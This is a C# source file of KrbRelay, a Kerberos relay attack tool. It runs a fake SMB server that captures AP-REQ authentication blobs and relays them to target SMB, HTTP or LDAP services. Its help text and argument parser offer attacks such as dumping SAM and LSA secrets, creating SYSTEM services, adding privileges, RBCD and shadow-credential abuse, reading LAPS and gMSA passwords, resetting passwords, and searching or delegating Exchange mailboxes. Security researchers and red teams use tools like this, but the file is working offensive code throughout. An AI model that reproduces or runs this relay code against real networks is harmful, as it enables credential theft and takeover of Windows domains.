using KrbRelay.Clients;
using KrbRelay.Com;
using Microsoft.Win32;
using NetFwTypeLib;
using Org.BouncyCastle.Crypto.Tls;
using SMBLibrary;
using SMBLibrary.Client;
using SMBLibrary.Services;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static KrbRelay.Natives;

namespace KrbRelay
{
    


    internal class Program
    {
        
        [StructLayout(LayoutKind.Sequential)]
        public struct SEC_WINNT_AUTH_IDENTITY
        {
            public IntPtr User;
            public int UserLength;
            public IntPtr Domain;
            public int DomainLength;
            public IntPtr Password;
            public int PasswordLength;
            public int Flags;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct COAUTHINFO
        {
            public int dwAuthnSvc;
            public int dwAuthzSvc;
            public IntPtr pwszServerPrincName;
            public int dwAuthnLevel;
            public int dwImpersonationLevel;
            public IntPtr pAuthIdentityData;
            public int dwCapabilities;
        }
        public struct COSERVERINFO2
        {
            public int dwReserved1;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pwszName;
            public IntPtr pAuthInfo;
            public int dwReserved2;
        }
        public static string DcomHost = "";
        public static string RedirectHost = "";
        public static string Username = "";
        public static string Password = "";
        public static string Domain= "";
        public static string FakeSPN = "";
        public static string ListenerPort = "";
        public static string service = "";

        private static TcpListener server;
        private static TcpClient myclient;
        public static byte[] AssocGroup = new byte[4];
        public static byte[] CallID= new byte[4];
        
        

        private static async Task StartListener(int port)
        
        {
            var tcpListener = TcpListener.Create(port);
            //NetworkStream ns2 = myclient.GetStream();
            int len;
            tcpListener.Start();

            //////////
            try
            {
                while (true)
                {
                    // Accept a client connection asynchronously
                    TcpClient client = await tcpListener.AcceptTcpClientAsync();

                    // Handle the client connection asynchronously
                    Task.Run(() => HandleClientAsync(client));
                }
            }
            finally
            {
                // Stop listening for incoming connections
                tcpListener.Stop();
            }
            
            
        }
        public static  int numClientConnect = 0;
        public static byte[] apreqBuffer;
        public static NetworkStream stream;
        
        
            public static byte[] ExtractSecurityBlob(byte[] sessionSetupRequest)
            {
                // SMB2 Header is usually 64 bytes
                int smb2HeaderLength = 64;

                // Session Setup Request starts after SMB2 Header
                int securityBufferOffsetPosition = smb2HeaderLength + 12;  // SecurityBufferOffset at byte 12 after header
                int securityBufferLengthPosition = smb2HeaderLength + 14;  // SecurityBufferLength at byte 14 after header

                // Read the Security Buffer Offset (2 bytes at offset position)
                int securityBufferOffset = BitConverter.ToUInt16(sessionSetupRequest, securityBufferOffsetPosition);

                // Read the Security Buffer Length (2 bytes at length position)
                int securityBufferLength = BitConverter.ToUInt16(sessionSetupRequest, securityBufferLengthPosition);

                // Now extract the Security Blob using the offset and length
                byte[] securityBlob = new byte[securityBufferLength];
                Array.Copy(sessionSetupRequest, securityBufferOffset, securityBlob, 0, securityBufferLength);

                return securityBlob;
            }
        
       

        static async Task HandleClientAsync(TcpClient client)
        {
            
            ++numClientConnect;
            Console.WriteLine("[*] Client connected: {0}", client.Client.RemoteEndPoint);
            //NetworkStream ns2 = myclient.GetStream();
            stream = client.GetStream();
            bool assocDone = false;
            byte[] smbNegotiateProtocolResponse = new byte[] { 0x0, 0x00, 0x00, 0xf8, 0xfe, 0x53, 0x4d, 0x42, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                                                0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                0x00,0x00,0x00,0x00,0x41,0x00,0x01,0x00,0xff,0x02,0x00,0x00,0x65,0x9d,0x73,0x71,
                                                                0x93,0xce,0x2f,0x48,0x99,0xe9,0x65,0xcb,0xe1,0x34,0xf5,0x31,0x07,0x00,0x00,0x00,
                                                                0x00,0x00,0x80,0x00,0x00,0x00,0x80,0x00,0x00,0x00,0x80,0x00,0x62,0x46,0x29,0x30,
                                                                0xae,0x15,0xdb,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x78,0x00,
                                                                0x00,0x00,0x00,0x00,0x60,0x76,0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02,0xa0,0x6c,
                                                                0x30,0x6a,0xa0,0x3c,0x30,0x3a,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,
                                                                0x02,0x1e,0x06,0x09,0x2a,0x86,0x48,0x82,0xf7,0x12,0x01,0x02,0x02,0x06,0x09,0x2a,
                                                                0x86,0x48,0x86,0xf7,0x12,0x01,0x02,0x02,0x06,0x0a,0x2a,0x86,0x48,0x86,0xf7,0x12,
                                                                0x01,0x02,0x02,0x03,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a,
                                                                0xa3,0x2a,0x30,0x28,0xa0,0x26,0x1b,0x24,0x6e,0x6f,0x74,0x5f,0x64,0x65,0x66,0x69,
                                                                0x6e,0x65,0x64,0x5f,0x69,0x6e,0x5f,0x52,0x46,0x43,0x34,0x31,0x37,0x38,0x40,0x70,
                                                                0x6c,0x65,0x61,0x73,0x65,0x5f,0x69,0x67,0x6e,0x6f,0x72,0x65};
            byte[] smb2NegotiateProtocolResponse = new byte[] {0x00,0x00,0x01,0x34,0xfe,0x53,0x4d,0x42,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,
                                                                0x00,0x00,0x00,0x00,0xff,0xfe,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                                0x00,0x00,0x00,0x00,0x41,0x00,0x01,0x00,0x11,0x03,0x02,0x00,0x65,0x9d,0x73,0x71,
                                                                0x93,0xce,0x2f,0x48,0x99,0xe9,0x65,0xcb,0xe1,0x34,0xf5,0x31,0x2f,0x00,0x00,0x00,
                                                                0x00,0x00,0x80,0x00,0x00,0x00,0x80,0x00,0x00,0x00,0x80,0x00,0x62,0x46,0x29,0x30,
                                                                0xae,0x15,0xdb,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x78,0x00,
                                                                0xf8,0x00,0x00,0x00,0x60,0x76,0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02,0xa0,0x6c,
                                                                0x30,0x6a,0xa0,0x3c,0x30,0x3a,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,
                                                                0x02,0x1e,0x06,0x09,0x2a,0x86,0x48,0x82,0xf7,0x12,0x01,0x02,0x02,0x06,0x09,0x2a,
                                                                0x86,0x48,0x86,0xf7,0x12,0x01,0x02,0x02,0x06,0x0a,0x2a,0x86,0x48,0x86,0xf7,0x12,
                                                                0x01,0x02,0x02,0x03,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a,
                                                                0xa3,0x2a,0x30,0x28,0xa0,0x26,0x1b,0x24,0x6e,0x6f,0x74,0x5f,0x64,0x65,0x66,0x69,
                                                                0x6e,0x65,0x64,0x5f,0x69,0x6e,0x5f,0x52,0x46,0x43,0x34,0x31,0x37,0x38,0x40,0x70,
                                                                0x6c,0x65,0x61,0x73,0x65,0x5f,0x69,0x67,0x6e,0x6f,0x72,0x65,0x01,0x00,0x26,0x00,
                                                                0x00,0x00,0x00,0x00,0x01,0x00,0x20,0x00,0x01,0x00,0x29,0xa6,0x59,0xda,0xea,0xa7,
                                                                0x13,0x09,0x93,0x27,0xdb,0x6e,0x41,0xee,0xf8,0x14,0x45,0x6e,0xdb,0xfa,0x09,0x8c,
                                                                0x14,0x87,0xf9,0x4c,0x14,0x73,0xca,0xbd,0xe5,0x20,0x00,0x00,0x02,0x00,0x04,0x00,
                                                                0x00,0x00,0x00,0x00,0x01,0x00,0x02,0x00};



            try
            {
                
                {
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    int numReads = 0;
                
                    while ((bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length)) != 0)
                    {
                
                        ++numReads;

                        //Console.WriteLine(Program.HexDump(buffer, 16, bytesRead));

                        if (numReads == 1)

                        {

                            Console.WriteLine("[*] sending smbNegotiateProtocolResponse");
                            await stream.WriteAsync(smbNegotiateProtocolResponse, 0, smbNegotiateProtocolResponse.Length);

                        }

                        if (numReads == 2)

                        {

                            Console.WriteLine("[*] sending smb2NegotiateProtocolResponse");
                            await stream.WriteAsync(smb2NegotiateProtocolResponse, 0, smb2NegotiateProtocolResponse.Length);

                        }
                        if (numReads == 3)
                        {
                            //int ticketOffset = Helpers.PatternAt(buffer, new byte[] { 0x60, 0x82 }); // 0x6e, 0x82, 0x06
                            buffer = buffer.Skip(4).ToArray();
                            Console.WriteLine("[*] Got AP-REQ for : {0}", service);
                            apreqBuffer = ExtractSecurityBlob(buffer);
                            
                            if (service == "cifs")
                            {
                                bool isConnected = smbClient.Connect(targetFQDN, SMBTransportType.DirectTCPTransport);
                                if (!isConnected)
                                {
                                    Console.WriteLine("[-] Could not connect to {0}:445", targetFQDN);
                                    return;
                                }
                                Smb.Connect();
                            }
                            if (service == "http")
                                Http.Connect();
                            
                            
                            return;
                        }
                        
                    }
                    
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error handling client: {0}", ex.Message);
            }
            finally
            {
                // Close the client connection
                client.Close();
                Console.WriteLine("Client disconnected: {0}", client.Client.RemoteEndPoint);
            }
        }
        public static string HexDump(byte[] bytes, int bytesPerLine = 16, int len=0)
        {
            if (bytes == null) return "<null>";
            int bytesLength;
            if (len == 0)
                bytesLength = bytes.Length;
            else
                bytesLength = len;
            char[] HexChars = "0123456789ABCDEF".ToCharArray();

            int firstHexColumn =
                  8                   // 8 characters for the address
                + 3;                  // 3 spaces

            int firstCharColumn = firstHexColumn
                + bytesPerLine * 3       // - 2 digit for the hexadecimal value and 1 space
                + (bytesPerLine - 1) / 8 // - 1 extra space every 8 characters from the 9th
                + 2;                  // 2 spaces 

            int lineLength = firstCharColumn
                + bytesPerLine           // - characters to show the ascii value
                + Environment.NewLine.Length; // Carriage return and line feed (should normally be 2)

            char[] line = (new String(' ', lineLength - 2) + Environment.NewLine).ToCharArray();
            int expectedLines = (bytesLength + bytesPerLine - 1) / bytesPerLine;
            StringBuilder result = new StringBuilder(expectedLines * lineLength);

            for (int i = 0; i < bytesLength; i += bytesPerLine)
            {
                line[0] = HexChars[(i >> 28) & 0xF];
                line[1] = HexChars[(i >> 24) & 0xF];
                line[2] = HexChars[(i >> 20) & 0xF];
                line[3] = HexChars[(i >> 16) & 0xF];
                line[4] = HexChars[(i >> 12) & 0xF];
                line[5] = HexChars[(i >> 8) & 0xF];
                line[6] = HexChars[(i >> 4) & 0xF];
                line[7] = HexChars[(i >> 0) & 0xF];

                int hexColumn = firstHexColumn;
                int charColumn = firstCharColumn;

                for (int j = 0; j < bytesPerLine; j++)
                {
                    if (j > 0 && (j & 7) == 0) hexColumn++;
                    if (i + j >= bytesLength)
                    {
                        line[hexColumn] = ' ';
                        line[hexColumn + 1] = ' ';
                        line[charColumn] = ' ';
                    }
                    else
                    {
                        byte b = bytes[i + j];
                        line[hexColumn] = HexChars[(b >> 4) & 0xF];
                        line[hexColumn + 1] = HexChars[b & 0xF];
                        line[charColumn] = asciiSymbol(b);
                    }
                    hexColumn += 3;
                    charColumn++;
                }
                result.Append(line);
            }
            return result.ToString();
        }
        static char asciiSymbol(byte val)
        {
            if (val < 32) return '.';  // Non-printable ASCII
            if (val < 127) return (char)val;   // Normal ASCII
            // Handle the hole in Latin-1
            if (val == 127) return '.';
            if (val < 0x90) return "€.‚ƒ„…†‡ˆ‰Š‹Œ.Ž."[val & 0xF];
            if (val < 0xA0) return ".‘’“”•–—˜™š›œ.žŸ"[val & 0xF];
            if (val == 0xAD) return '.';   // Soft hyphen: this symbol is zero-width even in monospace fonts
            return (char)val;   // Normal Latin-1
        }
        

        


        //
        
        public static byte[] StringToByteArray(string hex)
        {
            // Remove any non-hex characters
            hex = hex.Replace(" ", "");

            // Determine the length of the byte array (each two hex characters represent one byte)
            int byteCount = hex.Length / 2;

            // Create a byte array to store the converted bytes
            byte[] byteArray = new byte[byteCount];

            // Convert each pair of hex characters to a byte
            for (int i = 0; i < byteCount; i++)
            {
                // Parse the substring containing two hex characters and convert it to a byte
                byteArray[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }

            return byteArray;
        }
        
        public static SECURITY_HANDLE ldap_phCredential = new SECURITY_HANDLE();
        public static IntPtr ld = IntPtr.Zero;
        public static byte[] ntlm1 = new byte[] { };
        public static byte[] ntlm2 = new byte[] { };
        public static byte[] ntlm3 = new byte[] { };
        public static byte[] apRep1 = new byte[] { };
        public static byte[] apRep2 = new byte[] { };
        public static byte[] ticket = new byte[] { };
        public static string spn = "";
        public static string relayedUser = "";
        public static string relayedUserDomain = "";
        public static string domain = "";
        public static string domainDN = "";
        public static string targetFQDN = "";
        public static bool useSSL = false;
        public static bool stopSpoofing = false;
        public static bool downgrade = false;
        public static bool ntlm = false;
        public static Dictionary<string, string> attacks = new Dictionary<string, string>();
        public static SMB2Client smbClient = new SMB2Client();
        public static HttpClientHandler handler = new HttpClientHandler();
        public static HttpClient httpClient = new HttpClient();
        public static CookieContainer CookieContainer = new CookieContainer();

        //hooked function

        private static void ShowHelp()
        {
            Console.WriteLine();
            Console.WriteLine("KrbRelay by @Cube0x0");
            Console.WriteLine("The Relaying Kerberos Framework - SMB Server edition by @decoder_it");
            Console.WriteLine();

            Console.WriteLine("Usage: KrbRelay.exe -spn <SPN> [OPTIONS] [ATTACK]");
            Console.WriteLine("SMB attacks:");
            Console.WriteLine("-console                         Interactive SMB console");
            Console.WriteLine("-list                            List SMB shares");
            Console.WriteLine("-add-privileges <SID>            Add privileges for a given SID");
            Console.WriteLine("-secrets                         Dump SAM & LSA secrets");
            Console.WriteLine("-service-add <NAME> <COMMAND>    Create SYSTEM service");
            //Console.WriteLine("-set-secquestions                Reset security questions");
            //Console.WriteLine("-reset-password  <USER> <PASS>   Reset local user password");
            //Console.WriteLine("printdriver-add <DLL>           Add printer driver");
            //Console.WriteLine("-reg-query                     Query registry key");
            //Console.WriteLine("-upload   <Path>                 Upload file via SMB");
            //Console.WriteLine("-download <Path>                 Download file via SMB");
            Console.WriteLine();

            Console.WriteLine("HTTP attacks:");
            Console.WriteLine("-endpoint <ENDPOINT>             Example; 'EWS/Exchange.asmx'");
            Console.WriteLine("-proxy                           Start a HTTP proxy server against target");
            //Console.WriteLine("-adcs <TEMPLATE>                 Generate certificate");
            //Console.WriteLine("-ews-console                   EWS console");
            Console.WriteLine("-ews-delegate <USER@DOMAIN>      EWS delegate mailbox");
            //Console.WriteLine("-ews-read   <LIMIT>              Read victims inbox");
            Console.WriteLine("-ews-search <KEYWORD,KEYWORD2>   Search inbox for keywords");
            Console.WriteLine();

            Console.WriteLine("Options:");
            Console.WriteLine("-listener <port>                      Local relay port");
            Console.WriteLine("-redirectserver                       Relay server/redirector mapped to the sepcial DNS entry <server_name>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAA");
            Console.WriteLine("-ssl                      Use SSL transport");
            Console.WriteLine("-spn                      ServicePrincipalName for target service");
            Console.WriteLine("-clsid                    Service to be executed in");
            Console.WriteLine("-session                  ID for cross-session marshalling");
            Console.WriteLine("-port                     COM listener port");
            Console.WriteLine("-llmnr                    LLMNR poisoning");
        }

        public static bool checkPort(int port, string name = "SYSTEM")
        {
            INetFwMgr mgr = (INetFwMgr)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FwMgr"));
            if (!mgr.LocalPolicy.CurrentProfile.FirewallEnabled)
            {
                return true;
            }
            mgr.IsPortAllowed(name, NET_FW_IP_VERSION_.NET_FW_IP_VERSION_ANY, port, "", NET_FW_IP_PROTOCOL_.NET_FW_IP_PROTOCOL_TCP, out object allowed, out object restricted);
            return (bool)allowed;
        }

        public static int checkPorts(string[] names)
        {
            IPGlobalProperties ipGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
            IPEndPoint[] tcpConnInfoArray = ipGlobalProperties.GetActiveTcpListeners();
            List<int> tcpPorts = tcpConnInfoArray.Select(i => i.Port).ToList();

            foreach (string name in names)
            {
                for (int i = 1; i < 65535; i++)
                {
                    if (checkPort(i, name) && !tcpPorts.Contains(i))
                    {
                        return i;
                    }
                }
            }
            return -1;
        }

        public static void Main(string[] args)
        {
            string clsid = "";

            int sessionID = -123;
            string port = "9988";
            bool show_help = false;
            bool llmnr = false;
            Guid clsId_guid = new Guid();

            foreach (var entry in args.Select((value, index) => new { index, value }))
            {
                string argument = entry.value.ToUpper();


                switch (argument)
                {
                    case "-DCOMHOST":
                    case "/DCOMHOST":
                    case "-SMBHOST":
                    case "/SMBHOST":
                        DcomHost = args[entry.index + 1];
                        break;
                    case "-FAKESPN":
                    case "/FAKESPN":
                        FakeSPN = args[entry.index + 1];
                        break;
                    case "-REDIRECTHOST":
                    case "/REDIRECTHOSR":
                        RedirectHost = args[entry.index + 1];
                        break;
                    case "-LISTENERPORT":
                    case "/LISTENERPORT":
                        ListenerPort = args[entry.index + 1];
                        break;
                    case "-USERNAME":
                    case "/USERNAME":
                        Username = args[entry.index + 1];
                        break;
                    case "-PASSWORD":
                    case "/PASSWORD":
                        Password = args[entry.index + 1];
                        break;
                    case "-DOMAIN":
                    case "/DOMAIN":
                        Domain = args[entry.index + 1];
                        break;

                    case "-NTLM":
                    case "/NTLM":
                        ntlm = true;
                        break;

                    case "-DOWNGRADE":
                    case "/DOWNGRADE":
                        downgrade = true;
                        break;
                    case "-LISTEN":
                    case "/LISTEN":
                        ListenerPort = args[entry.index + 1];
                        break;
                    //
                    case "-CONSOLE":
                    case "/CONSOLE":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("console", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("console", "");
                        }
                        break;
                    // ldap attacks
                    case "-RBCD":
                    case "/RBCD":
                        try
                        {
                            if (args[entry.index + 2].StartsWith("/") || args[entry.index + 2].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("rbcd", args[entry.index + 1] + " " + args[entry.index + 2]);
                        }
                        catch
                        {
                            try
                            {
                                if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                    throw new Exception();
                                attacks.Add("rbcd", args[entry.index + 1] + " " + "");
                            }
                            catch
                            {
                                Console.WriteLine("[-] -rbcd requires an argument");
                                return;
                            }
                        }
                        break;

                    case "-SHADOWCRED":
                    case "/SHADOWCRED":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("shadowcred", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("shadowcred", "");
                        }
                        break;

                    case "-LAPS":
                    case "/LAPS":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("laps", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("laps", "");
                        }
                        break;

                    case "-GMSA":
                    case "/GMSA":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("gmsa", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("gmsa", "");
                        }
                        break;

                    case "-ADD-GROUPMEMBER":
                    case "/ADD-GROUPMEMBER":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            if (args[entry.index + 2].StartsWith("/") || args[entry.index + 2].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("add-groupmember", args[entry.index + 1] + " " + args[entry.index + 2]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -add-groupmember requires two arguments");
                            return;
                        }
                        break;

                    case "-RESET-PASSWORD":
                    case "/RESET-PASSWORD":
                        try
                        {
                            if (args[entry.index + 2].StartsWith("/") || args[entry.index + 2].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("reset-password", args[entry.index + 1] + " " + args[entry.index + 2]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -reset-password requires two arguments");
                            return;
                        }
                        break;

                    // smb attacks
                    case "-LIST":
                    case "/LIST":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("list", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("list", "");
                        }
                        break;

                    case "-UPLOAD":
                    case "/UPLOAD":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("upload", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -upload requires an argument");
                            return;
                        }
                        break;

                    case "-DOWNLOAD":
                    case "/DOWNLOAD":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("download", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -download requires an argument");
                            return;
                        }
                        break;

                    case "-SECRETS":
                    case "/SECRETS":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("secrets", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("secrets", "");
                        }
                        break;

                    case "-ADD-PRIVILEGES":
                    case "/ADD-PRIVILEGES":
                        try
                        {
                            attacks.Add("add-privileges", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -add-privileges requires an argument");
                            return;
                        }
                        break;

                    case "-SERVICE-ADD":
                    case "/SERVICE-ADD":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            if (args[entry.index + 2].StartsWith("/") || args[entry.index + 2].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("service-add", args[entry.index + 1] + " " + args[entry.index + 2]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -service-add requires two arguments");
                            return;
                        }
                        break;

                    case "-ADD-PRINTERDRIVER":
                    case "/ADD-PRINTERDRIVER":
                        try
                        {
                            attacks.Add("add-priverdriver", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -add-priverdriver requires an argument");
                            return;
                        }
                        break;

                    // http attacks
                    case "-ENDPOINT":
                    case "/ENDPOINT":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("endpoint", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -endpoint requires an argument");
                            return;
                        }
                        break;

                    case "-ADCS":
                    case "/ADCS":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("adcs", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -adcs requires an argument");
                            return;
                        }
                        break;

                    case "-PROXY":
                    case "/PROXY":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("proxy", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("proxy", "");
                        }
                        break;

                    case "-EWS-CONSOLE":
                    case "/EWS-CONSOLE":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("ews-console", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("ews-console", "");
                        }
                        break;

                    case "-EWS-DELEGATE":
                    case "/EWS-DELEGATE":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("ews-delegate", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -ews-delegate requires an argument");
                            return;
                        }
                        break;

                    case "-EWS-SEARCH":
                    case "/EWS-SEARCH":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("ews-search", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -ews-search requires an argument");
                            return;
                        }
                        break;

                    //optional
                    case "-H":
                    case "/H":
                        show_help = true;
                        break;

                    case "-SSL":
                    case "/SSL":
                        useSSL = true;
                        break;
                    case "-LLMNR":
                    case "/LLMNR":
                        llmnr = true;
                        break;

                    case "-PORT":
                    case "/PORT":
                        port = args[entry.index + 1];
                        break;

                    case "-SPN":
                    case "/SPN":
                        spn = args[entry.index + 1];
                        break;

                    case "-CLSID":
                    case "/CLSID":
                        clsid = args[entry.index + 1];
                        break;

                    case "-SESSION":
                    case "/SESSION":
                        sessionID = Int32.Parse(args[entry.index + 1]);
                        break;
                }
            }

            if (show_help)
            {
                ShowHelp();
                return;
            }

            if (string.IsNullOrEmpty(spn) && ntlm == false)
            {
                Console.WriteLine("Missing /spn: parameter");
                Console.WriteLine("KrbRelay.exe -h for help");
                return;
            }

            /*if (string.IsNullOrEmpty(clsid))
            {
                Console.WriteLine("Missing /clsid: parameter");
                Console.WriteLine("KrbRelay.exe -h for help");
                return;
            }*/

            if (!string.IsNullOrEmpty(spn))
            {
                service = spn.Split('/').First().ToLower();
                if (!(new List<string> { "ldap", "cifs", "http" }.Contains(service)))
                {
                    Console.WriteLine("'{0}' service not supported", service);
                    Console.WriteLine("choose from CIFS, LDAP and HTTP");
                    return;
                }
                string[] d = spn.Split('.').Skip(1).ToArray();
                domain = string.Join(".", d);

                string[] dd = spn.Split('/').Skip(1).ToArray();
                targetFQDN = string.Join(".", dd);

            }
            service = spn.Split('/').First();
            if (!string.IsNullOrEmpty(domain))
            {
                var domainComponent = domain.Split('.');
                foreach (string dc in domainComponent)
                {
                    domainDN += string.Concat(",DC=", dc);
                }
                domainDN = domainDN.TrimStart(',');
            }

            if (!string.IsNullOrEmpty(clsid))
                clsId_guid = new Guid(clsid);

            //
            //setUserData(sessionID);
            string pPrincipalName;
            if (FakeSPN == "")
                pPrincipalName = spn;
            else
                pPrincipalName = FakeSPN;
           
            if (service == "cifs")
            {
                bool isConnected = smbClient.Connect(targetFQDN, SMBTransportType.DirectTCPTransport);
                if (!isConnected)
                {
                    Console.WriteLine("[-] Could not connect to {0}:445", targetFQDN);
                    return;
                }
                //Smb.Connect();

                //Console.WriteLine("smc conn done");
                //Console.ReadKey();
            }
            if (service == "http")
            {
                if (!attacks.Keys.Contains("endpoint") || string.IsNullOrEmpty(attacks["endpoint"]))
                {
                    Console.WriteLine("[-] -endpoint parameter is required for HTTP");
                    return;
                }
                //handler = new HttpClientHandler() { PreAuthenticate = false, UseCookies = false };
                ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                handler = new HttpClientHandler() { UseDefaultCredentials = false, PreAuthenticate = false, UseCookies = true };
                
                httpClient = new HttpClient(handler) { Timeout = new TimeSpan(0, 0, 10) };
                string transport = "http";
                if (useSSL)
                {
                    transport = "https";
                }
                httpClient.BaseAddress = new Uri(string.Format("{0}://{1}", transport, targetFQDN));
                
            }


            
            Console.WriteLine("[*] Socket Server Start: {0}", int.Parse(ListenerPort));
            if (ListenerPort == "")
                StartListener(9999).Wait();
            else
                StartListener(int.Parse(ListenerPort)).Wait();

        }
    }
}